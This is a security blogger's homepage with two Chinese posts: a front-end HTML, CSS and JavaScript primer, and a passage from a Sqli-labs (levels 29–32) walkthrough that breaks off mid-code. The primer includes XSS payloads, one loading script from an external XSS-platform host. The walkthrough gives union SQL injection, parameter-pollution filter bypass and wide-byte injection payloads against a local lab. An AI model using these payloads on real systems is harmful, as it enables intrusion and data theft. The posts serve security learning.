<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/uploads/xzpq.jpg?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="找回当年那个被寄予厚望的自己">
<meta property="og:type" content="website">
<meta property="og:title" content="P0rZ9&#39;s blog">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="P0rZ9&#39;s blog">
<meta property="og:description" content="找回当年那个被寄予厚望的自己">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="P0rZ9&#39;s blog">
<meta name="twitter:description" content="找回当年那个被寄予厚望的自己">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/"/>





  <title>P0rZ9's blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">P0rZ9's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/07/java_web_前端基础/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/11/07/java_web_前端基础/" itemprop="url">基础知识 | 前端基础知识</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-07T08:15:41+08:00">
                2018-11-07
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><p>HTML,超文本标记语言,主要作用是通过HTML标记对网页中文本,图片,声音等进行描述。<br>一个最基本的html文档:</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;This is title&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>各个标签:    </p>
<pre><code>单双标记:&lt;hr /&gt;  &lt;html&gt;&lt;/html&gt;    
段落：&lt;p&gt;&lt;/p&gt;     
换行:&lt;br /&gt;
文本样式:&lt;font face=&quot;微软雅黑&quot; size=&quot;7&quot; color=&quot;green&quot;&gt;&lt;br /&gt;文本1&lt;/font&gt;
图像:&lt;img src=&quot;/1.jpg&quot; width=&quot;100&quot; height=&quot;111&quot; border=&quot;0&quot; /&gt;
表格：//使得网页中的数据能够有条理地显示,可使用表格对网页进行规划
&lt;table&gt;//表格
    &lt;tr&gt;//行
        &lt;td&gt;单元格&lt;/td&gt;//列
        &lt;td&gt;单元格1&lt;/td&gt;
        &lt;td&gt;单元格2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;单元格4&lt;/td&gt;
        &lt;td&gt;单元格5&lt;/td&gt;
        &lt;td&gt;单元格6&lt;/td&gt;
    &lt;/tr&gt;
&lt;/table&gt;

表单:由表单控件,提示信息,表单域3部分组成
&lt;form action=&quot;#&quot; method=&quot;post&quot; name=&quot;表单名称&quot;&gt;  //#表示提交到当前页面
    &lt;input type=&quot;控件类型&quot; /&gt; //除type属性,常用的id name value size
    //控件类型 text(文本输入)  password(密码) radio(单选框) 复选框(checkbox) 上传控件(file) 提交(submit) 重置(reset)
&lt;/form&gt;

注释:&lt;!--注释内容--&gt;
多行文本:&lt;textarea&gt;&lt;/textarea&gt;    
超链接标记:&lt;a href=&quot;http://www.baidu.com&quot; target=&quot;_blank&quot;&gt;百度&lt;/a&gt;  //新窗口打开
         &lt;a href=&quot;http://www.baidu.com&quot; target=&quot;_self&quot;&gt;百度&lt;/a&gt;  //本窗口打开

&lt;div&gt;标记:常与css搭配使用
列表标记:
    无序列表:&lt;ul&gt;&lt;/ul&gt;
    &lt;ul&gt;//定义无序列表
        &lt;li type=&quot;disc&quot;&gt;列1&lt;/li&gt;  //&lt;li&gt;&lt;/li&gt;描述具体列表项 type有3种 分别为:disc square circle,默认属性为disc
        &lt;li type=&quot;square&quot;&gt;列2&lt;/li&gt;
        &lt;li type=&quot;circle&quot;&gt;列3&lt;/li&gt;
    &lt;/ul&gt;
</code></pre><h2 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h2><p>CSS用于增强控制网页样式并允许将样式信息与网页内容分离的一种标记性语言。在实际中主要用于设置显示样式。<br>定义规则:</p>
<pre><code>选择器{属性一:属性值一; 属性二:属性值二;} /*选择器指定对象 属性设置*/
</code></pre><h3 id="CSS引用方式"><a href="#CSS引用方式" class="headerlink" title="CSS引用方式"></a>CSS引用方式</h3><p>引用方式一共有4种,分别为链入式,行内式,内嵌式和导入式。<br>例子:</p>
<pre><code>  #内嵌式:style写在head头部标记中
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;style type=&quot;text/css&quot;&gt;
        h2{ text-align: center; }/*h2标签的内容居中*/
        div{ border: 1px solid red; width: 300px; height: 300px; color: blue; }
        /*div为选择器,表示css作用的html对象 边框,宽度和高度; 1px solid red表示1像素 实心边框线 红色*/
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h2&gt;hello css&lt;/h2&gt;
    &lt;div id=&quot;div1&quot;&gt;
        &lt;p id=&quot;p1&quot;&gt;hello p1&lt;/p&gt;
        &lt;p id=&quot;p2&quot;&gt;hello p2&lt;/p&gt;
    &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;

#链入式:像js一样引入css文件即可
&lt;link href=&quot;test_demo.css&quot; type=&quot;text/css&quot; rel=&quot;stylesheet&quot; /&gt;  //rel:声明当前文档与被链接文档之间的关系 stylesheet表示样式表文件  且css文件中不写&lt;style&gt;&lt;/style&gt;
</code></pre><h3 id="常用属性"><a href="#常用属性" class="headerlink" title="常用属性"></a>常用属性</h3><pre><code>a.标记选择器 标记名{属性名1:属性值1; 属性2:属性值2;}
b.类选择器    .类名{属性名1:属性值1; 属性2:属性值2;}
c.id选择器     #id{属性名1:属性值1; 属性2:属性值2;}
d.通配符选择器 *{属性名1:属性值1; 属性2:属性值2;}
</code></pre><p>例子用了类与id选择器:</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;style type=&quot;text/css&quot;&gt;
        /*类选择器*/
        .red {
            color: red;
        }
        .green {
            color: green;
        }
        .font18 {
            font-size: 18px;
        }

        /*#_id选择器*/
        #p1 {
            font-weight: bold;
        }
        #p2 {
            font-size: 24px;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;!--类选择器的使用--&gt;
    &lt;h1 class=&quot;red&quot;&gt;标题1: class=&quot;red&quot;&lt;/h1&gt;
    &lt;h1 class=&quot;green font18&quot;&gt;标题1: 绿色,字号为18px&lt;/h1&gt;
    &lt;h1 class=&quot;red font18&quot;&gt;标题1: 红色,字号为18px&lt;/h1&gt;

    &lt;!--id选择器的使用--&gt;
    &lt;p id=&quot;p1&quot;&gt;段落1:设置为粗体&lt;/p&gt;
    &lt;p id=&quot;p2&quot;&gt;段落2:字号为24&lt;/p&gt;
    &lt;p id=&quot;p2 p1&quot;&gt;段落:粗体+字号为24&lt;/p&gt;&lt;!--错误的  同一个标记对象不能同时引用多个id--&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>更多属性参考:<a href="http://www.w3school.com.cn/cssref/index.asp" target="_blank" rel="noopener">CSS 参考手册</a></p>
<h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><h3 id="JavaScript-HTML-DOM"><a href="#JavaScript-HTML-DOM" class="headerlink" title="JavaScript HTML DOM"></a>JavaScript HTML DOM</h3><p>当网页被加载时,浏览器会创建页面的文档对象模型(Document Object Model)<br>html dom模型被构造为对象的树<br>HTML DOM树：<br><img src="http://www.w3school.com.cn/i/ct_htmltree.gif" alt="xxxx">    </p>
<p>通过可编程的对象模型,js获得了足够的能力来创建动态的html。    </p>
<blockquote>
<p>JavaScript 能够改变页面中的所有 HTML 元素<br>JavaScript 能够改变页面中的所有 HTML 属性<br>JavaScript 能够改变页面中的所有 CSS 样式<br>JavaScript 能够对页面中的所有事件做出反应    </p>
</blockquote>
<h3 id="DOM-HTML"><a href="#DOM-HTML" class="headerlink" title="DOM HTML"></a>DOM HTML</h3><p>JavaScript 能够改变页面中的所有<code>HTML</code>元素及属性<br>a.通过元素的id属性获取元素</p>
<pre><code>#获取id属性的值为userid节点的代码:
document.getElementById(&quot;userid&quot;)
</code></pre><p>b.通过元素的name属性获取元素(由于多个元素可能有相同的name值,所以返回的是一个数组,通过其下标元素进行获取)</p>
<pre><code>#获取name属性的值为userid节点的代码:
document.getElementByName(&quot;username&quot;)[0]
</code></pre><p>c.改变HTML元素的内容</p>
<pre><code>#直接向HTML输出流写内容:
&lt;script&gt;
    document.write(Date());
&lt;/script&gt;

#改变 HTML 内容:
document.getElementById(id).innerHTML=new HTML

#改变id为p2的src属性值:
document.getElementById(&quot;p2&quot;).src = &quot;xxx.jpg&quot;;
</code></pre><h3 id="DOM-CSS"><a href="#DOM-CSS" class="headerlink" title="DOM CSS"></a>DOM CSS</h3><p>JavaScript 能够改变页面中的所有 CSS 样式</p>
<h3 id="DOM-事件"><a href="#DOM-事件" class="headerlink" title="DOM 事件"></a>DOM 事件</h3><p>HTML DOM 使 JavaScript 有能力对 HTML 事件做出反应。</p>
<pre><code>#点击文本变为test
&lt;h1 onclick=&quot;this.innerHTML=&apos;test&apos;&quot;&gt;请点击该文本&lt;/h1&gt;

&lt;h1 onclick=&quot;xxx(this)&quot;&gt;请点击该文本&lt;/h1&gt;
function xxx(id){
        id.innerHTML=&apos;test&apos;;
    }
</code></pre><p>html事件属性:</p>
<pre><code>#点击按钮后,运行displayDate()函数
&lt;button onclick=&quot;displayDate()&quot;&gt;点击这里&lt;/button&gt;

#根据id添加onclick事件,当按钮被点击后,执行displayDate()函数
document.getElementById(&quot;myButn&quot;).onclick = function(){displayDate()};
</code></pre><p>利用onload处理cookie:</p>
<pre><code>&lt;body onload=&quot;checkCookies()&quot;&gt;
&lt;script&gt;
function checkCookies()
{
if (navigator.cookieEnabled==true)
    {
    alert(&quot;已启用 cookie&quot;)
    }
else
    {
    alert(&quot;未启用 cookie&quot;)
    }
}
&lt;/script&gt;
</code></pre><p> 此外,常用的事件还有onchange,onmouseover,onmouseout等等</p>
<h3 id="DOM-节点"><a href="#DOM-节点" class="headerlink" title="DOM 节点"></a>DOM 节点</h3><p> 创建新的HTML元素:如需向HTML DOM添加新元素,必须先创建该元素节点,然后向一个已经存在的元素追加该元素</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div id=&quot;div1&quot;&gt;
        &lt;p id=&quot;p1&quot;&gt;hello p1&lt;/p&gt;
        &lt;p id=&quot;p2&quot;&gt;hello p2&lt;/p&gt;
    &lt;/div&gt;
    &lt;script type=&quot;text/javascript&quot;&gt;
        var para = document.createElement(&apos;p3&apos;);//创建一个P3标签
        var node = document.createTextNode(&apos;hello p3&apos;);//创建一个文本节点
        para.appendChild(node);//向P3元素添加文本内容

        var element = document.getElementById(&apos;div1&apos;);//找到一个已有元素
        element.appendChild(para);//追加新元素
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p> 删除已有的html元素:如需删除HTML元素,必须首先获得该元素的父元素</p>
<pre><code> &lt;body&gt;
    &lt;div id=&quot;div1&quot;&gt;
        &lt;p id=&quot;p1&quot;&gt;hello p1&lt;/p&gt;
        &lt;p id=&quot;p2&quot;&gt;hello p2&lt;/p&gt;
    &lt;/div&gt;
    &lt;script type=&quot;text/javascript&quot;&gt;
        var parent = document.getElementById(&apos;div1&apos;);
        var child = document.getElementById(&apos;p1&apos;);
        parent.removeChild(child);
    &lt;/script&gt;
&lt;/body&gt;
</code></pre><p> 在不引用父元素的情况下删除某个元素,使用parentNode属性来找到父元素</p>
<pre><code>var child = document.getElementById(&apos;p2&apos;);
hild.parentNode.removeChild(child);
</code></pre><h3 id="javascript的引入方式"><a href="#javascript的引入方式" class="headerlink" title="javascript的引入方式:"></a>javascript的引入方式:</h3><p>内嵌式:</p>
<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
    document.write(&quot;Hello World&quot;)
&lt;/script&gt;
</code></pre><p>外链式:<br>当脚本代码比较复杂或者同一段代码需要被多个网页文件同时使用时,可以将这些脚本代码放置在一个扩展名为.js的文件中,然后通过外链方法引入即可</p>
<pre><code>&lt;script type=&quot;text/javascript&quot; src=&quot;js文件路径&quot;&gt;&lt;/script&gt;
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-03.12.37.07-image.png" alt="2018-11-03.12.37.07-image.png"></p>
<p>我们在测试xss漏洞时,使用的就是外链引入,而js代码就存储在xss平台的js文件里,测试payload:</p>
<pre><code>&lt;script src=http://c7.gg/beXLv&gt;&lt;/script&gt;
</code></pre><p>如果直接访问<code>http://c7.gg/beXLv</code>,可以看到js代码。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-03.13.04.01-image.png" alt="2018-11-03.13.04.01-image.png"></p>
<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型:"></a>数据类型:</h3><table>
<thead>
<tr>
<th>类型</th>
<th>含义</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Number</td>
<td>数值型</td>
<td>不区分整性与浮点型,数值不需要用引号括起来</td>
</tr>
<tr>
<td>String</td>
<td>字符串</td>
<td>‘或”括起来的一个或多个字符</td>
</tr>
<tr>
<td>Boolean</td>
<td>布尔</td>
<td>True,False</td>
</tr>
<tr>
<td>Object</td>
<td>对象</td>
<td>一组数据和功能的键值对集合</td>
</tr>
<tr>
<td>Null</td>
<td>空类型</td>
<td>无任何值</td>
</tr>
<tr>
<td>Undefined</td>
<td>未定义</td>
<td>变量被创建,但未赋值</td>
</tr>
</tbody>
</table>
<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>使用var声明变量,由于JavaScript为一种弱类型语言,所以在声明时不需要指定变量类型,变量类型由变量的赋值情况来确定,语法格式如下:</p>
<pre><code>var number=1;
var str1=&quot;Hello world&quot;;
</code></pre><p>变量名需遵循命名规则,变量名可由下划线<code>(_)</code>,字母,美元符号($),中文(不建议),不能使用JavaScript的关键字。</p>
<p>需要注意,这些关键字同样不可用作函数名,对象名及自定义的方法名。</p>
<h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><p>a.算术运算符:+ - <em> / ++ –<br>b.比较运算符:&lt; &gt; &lt;= &gt;= ==(只对表面进行比较 “27”==27 true)  !=(表面比较 “27”!=27 false)<br>c.逻辑运算符:&amp;&amp; || !(与 或 非)<br>d.赋值运算符:`= += -+ </em>= /= %=(a%=b相当于a=a%b)`<br>e.条件运算符:操作数?结果一:结果二  (如果操作数的值为true,则表达式结果为1,否则为2)</p>
<h3 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h3><p>if必须为小写,当执行语句只有一行时,可以省略<code>{}</code></p>
<pre><code>#单向判断
if(条件)
{
    //code
} 

#双向判断
if(条件){
    //code1
}
else{
    //code1
}

#多向判断:当条件1和条件2都不为true时执行code3的代码
if(条件1){
    //code1    
}
else if(条件2){
    //code2
}
else{
    //code3
}
</code></pre><h3 id="JavaScript的使用"><a href="#JavaScript的使用" class="headerlink" title="JavaScript的使用"></a>JavaScript的使用</h3><p>1.函数定义及调用:<br>定义函数是通过function语句实现的,语法格式:</p>
<pre><code>function FunctionName(par1,par2){
    statements;
    {return expression;}#可返回任意表达式,变量,常量。可省略
}
</code></pre><p>函数名唯一且区分大小写</p>
<h3 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h3><p>采用事件驱动是JavaScript最基本的特征,所谓的事件是指用户在访问页面时执行的操作。事件处理通常分为3步:发生事件,启动事件处理程序,对事件处理程序做出反应。上例子,就明白了:</p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-03.14.09.43-image.png" alt="2018-11-03.14.09.43-image.png"></p>
<p>在点击’click me’后,会弹出提示窗口,对用户提示.我们在xss测试中常用的payload:<code>&lt;img src=1 onerror=&quot;alert(1)&quot;&gt;</code><br>除onclick与onerror外,JavaScript还有很多常用的事件类型:</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>当以下情况发生时，出现此事件 </th>
</tr>
</thead>
<tbody>
<tr>
<td>onblur</td>
<td>元素失去焦点</td>
</tr>
<tr>
<td>onchange</td>
<td>用户改变域的内容</td>
</tr>
<tr>
<td>onfocus</td>
<td>元素获得焦点</td>
</tr>
<tr>
<td>onreset</td>
<td>重置按钮被点击</td>
</tr>
<tr>
<td>onsubmit</td>
<td>提交按钮被点击</td>
</tr>
<tr>
<td>onunload</td>
<td>用户退出页面</td>
</tr>
</tbody>
</table>
<h3 id="常用对象"><a href="#常用对象" class="headerlink" title="常用对象"></a>常用对象</h3><p>(1)Windows对象<br>(2)Date对象<br>主要用于处理事件:</p>
<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
    //var myDate=new Date();
    var test=new Date();#创建Date对象

    document.write(test.constructor);//返回Date()

    //2018.11.03 15:19:56  星期六
    document.write(Date());//返回当前时间
    document.write(test.getDate());//3
    document.write(test.getDay());//6
    document.write(test.getMonth());//10
    document.write(test.getFullYear());//2018
    document.write(test.getHours());//15
    document.write(test.getMinutes());//19
    document.write(test.getSeconds());//56
    document.write(test.getTime());//1541229596407 从1970年1月1日至今的毫秒数

    //时间设置类似
&lt;/script&gt;
</code></pre><p>(3)String对象</p>
<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
    //var myDate=new Date();
    var text = &quot;Hello world&quot;;
    var str=&quot;How are you doing today?&quot;

    //对象属性
    document.write(text.length + &quot;&lt;br /&gt;&quot;);//返回text长度 一个汉字也是一个字符


    //对象方法
    document.write(text.indexOf(&apos;Hello&apos;) + &quot;&lt;br /&gt;&quot;);//返回Hello第一次在text出现的位置0  若无则返回-1
    document.write(text.indexOf(&apos;World&apos;) + &quot;&lt;br /&gt;&quot;);//返回-1 因为对大小写敏感

    document.write(text.lastIndexOf(&apos;Hello&apos;) + &quot;&lt;br /&gt;&quot;);//从后往前检索字符串 返回0
    document.write(text.substr(3) + &quot;&lt;br /&gt;&quot;);//返回lo world
    document.write(text.substr(3,7) + &quot;&lt;br /&gt;&quot;);//从3开始 取7个字符 返回lo worl

    document.write(text.substring(3) + &quot;&lt;br /&gt;&quot;);//返回lo world
    document.write(text.substring(3,7) + &quot;&lt;br /&gt;&quot;);//取下标为3到7的字符,返回lo w

    document.write(str.split(&quot; &quot;) + &quot;&lt;br /&gt;&quot;);//根据空返回数组 通过[1] [2]可访问
    document.write(str.split(&quot;&quot;) + &quot;&lt;br /&gt;&quot;);//每个字符都会分割


    document.write(str.search(/are/) + &quot;&lt;br /&gt;&quot;);//检索doing 返回12 大小写敏感
    document.write(str.search(/Are/i) + &quot;&lt;br /&gt;&quot;);//检索doing  大小写不敏感

    document.write(text.replace(/world/, &quot;Z9&quot;) + &quot;&lt;br /&gt;&quot;);//将world替换为Z9
    document.write(text.replace(/world/g, &quot;Z9&quot;) + &quot;&lt;br /&gt;&quot;);//将world全替换为Z9
    document.write(text.replace(/world/i, &quot;Z9&quot;) + &quot;&lt;br /&gt;&quot;);//将world(大小写)全替换为Z9


    document.write(text.toLowerCase() + &quot;&lt;br /&gt;&quot;);//全转化为小写
    document.write(text.toUpperCase() + &quot;&lt;br /&gt;&quot;);//全转化为大写
&lt;/script&gt;
</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/01/Sqli-labs Less29-37/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/11/01/Sqli-labs Less29-37/" itemprop="url">Sqli-labs less29-37</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-01T08:15:41+08:00">
                2018-11-01
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="less-29"><a href="#less-29" class="headerlink" title="less-29"></a>less-29</h3><p>刚开始做这关,直接在<code>index.php</code>注的,无任何防护,直接联合注入即可,但是返回去看网上的教程发现题目应该是要求在<code>login.php</code>页面进行注入</p>
<p>index.php直接联合注入即可:    </p>
<pre><code>http://127.0.0.1:86/less-29/index.php?id=-1&apos; union select 1,database(),3%23
</code></pre><p>login.php的注入:</p>
<p><code>login.php</code>关键过滤代码:</p>
<pre><code>function whitelist($input)
{
    $match = preg_match(&quot;/^\d+$/&quot;, $input);
    if($match)
    {
        //echo &quot;you are good&quot;;
        //return $match;
    }
    else
    {    
        header(&apos;Location: hacked.php&apos;);
        //echo &quot;you are bad&quot;;
    }
}
function java_implimentation($query_string)
{
    $q_s = $query_string;
    $qs_array= explode(&quot;&amp;&quot;,$q_s);


    foreach($qs_array as $key =&gt; $value)
    {
        $val=substr($value,0,2);
        if($val==&quot;id&quot;)
        {
            $id_value=substr($value,3,30); 
            return $id_value;
            echo &quot;&lt;br&gt;&quot;;
            break;
        }

    }

}
</code></pre><p>代码逻辑:<br>1.首先用<code>$_SERVER[&#39;QUERY_STRING&#39;];</code>获取?之后的查询字符串,然后去<code>java_implimentation()</code>函数过滤,返回id参数的值。<br>2.将返回的id参数的值给了函数<code>whitelist</code>,如果是数字则查询,否则跳转到<code>hacked.php</code></p>
<p>重点:<br>此处服务器配置情况:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-31.12.41.56-image.png" alt="2018-10-31.12.41.56-image.png"><br>然后假设我们发送一个请求:<br><code>http://127.0.0.1:86/less-29/login.php?id=1&amp;id=2</code><br>对于这个请求,<code>apache(php)</code>解析最后一个参数,即显示id=2的内容，<code>Tomcat(jsp)</code>解析第一个参数,即显示id=1的内容</p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-31.09.43.42-image.png" alt="2018-10-31.09.43.42-image.png"></p>
<p>那这一关,根据该处的服务器配置情况,客户端的请求首先经过<code>tomcat</code>服务器,<code>tomcat</code>会解析第一个参数,接下来<code>tomcat</code>去请求<code>apache(php)</code>服务器,而<code>apache</code>会解析最后一个参数,那么最终返回的肯定是<code>apache</code>处理的数据。因为在实际情况中,如果配置两层服务器的情况,往往我们会在第一台服务器做数据处理和过滤,其功能类似于一个waf。而正是因为前后两层服务器对参数解析的不同,我们就可使用<code>HPP</code>(参数污染)攻击,该攻击会对服务器和客户端造成威胁。</p>
<p>这里我们用参数污染的方式进行绕过:</p>
<pre><code>login.php?id=1&amp;id=1&apos; and 1=1%23
</code></pre><p>进入<code>java_implimentation()</code>函数的是?后面的整个字符串,返回的是第一个字段内容1,为数字成功绕过第一步的<code>tomcat</code>服务器的检测,到达<code>apache</code>服务器,执行第二个参数的语句。<br>然后后面的话,改变第二个参数的值即可。</p>
<h3 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h3><p>将less-29的闭合符<code>&#39;</code>变为<code>&quot;</code>即可。</p>
<h3 id="less-31"><a href="#less-31" class="headerlink" title="less-31"></a>less-31</h3><p>将less-29的闭合符<code>&#39;</code>变为<code>&quot;)</code>即可。</p>
<hr>
<p>HPP:<br>HPP不是一种漏洞,但是在网站存在waf的情况下可以帮助攻击者绕过waf。HPP参数污染,简单的讲就是给相同名称参数赋上两个或两个以上的值,导致应用程序以意外方式解释值而出现漏洞。</p>
<p>我们把搜索的参数赋2个值看下<br>baidu:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-31.16.22.19-image.png" alt="2018-10-31.16.22.19-image.png"></p>
<p>bing:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-31.16.23.49-image.png" alt="2018-10-31.16.23.49-image.png"></p>
<p>百度取第一个而bing搜索取第二个参数,这是因为不同的网站(服务器)对相同参数的处理方式不同。</p>
<p>我们less-29就是<code>waf(tomcat)</code>检验的是第一个参数值而<code>apache</code>服务器执行的却是第二个参数值导致绕过了waf。</p>
<hr>
<p>下面的几关都是涉及宽字节注入的,我们介绍一下宽字节注入的原理及用法:<br>原理:mysql在使用GBK编码时,会认为2个字符为1个汉字,例如<code>%df%5c</code>就是一个汉字,程序在过滤’时,一般会选择将’转化为\’,对于攻击者来说,绕过这种过滤,一般有两种思路:</p>
<p>1.将\吃掉  具体原因:<code>urldecode(\&#39;)=%5c%27</code> 我们在前面添加%df使其变成<code>%df%5c%27</code> 而根据上面提到的,mysql在GBK编码时会将2个字节当作一个汉字,此时<code>%df%5c</code>就是一个汉字,%27被当作单独的符号在外面,就达到了使单引号逃逸的目的。    </p>
<p>2.将\过滤,例如构造<code>%5c%5c%27</code>,第一个\转义第二个\,也可以使得单引号’逃逸,不过这种情况只适用于\没有被过滤得情况</p>
<h3 id="less-32"><a href="#less-32" class="headerlink" title="less-32"></a>less-32</h3><p>我们尝试payload:</p>
<pre><code>http://127.0.0.1:86/less-32/index.php?id=-1%df%27 union select 1,user(),3%23
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-11-01.09.32.32-image.png" alt="2018-11-01.09.32.32-image.png"></p>
<p>可以看到<code>&#39;</code>成功逃逸,造成注入。</p>
<p><code>less-32</code>代码:</p>
<pre><code>function check_addslashes($string)
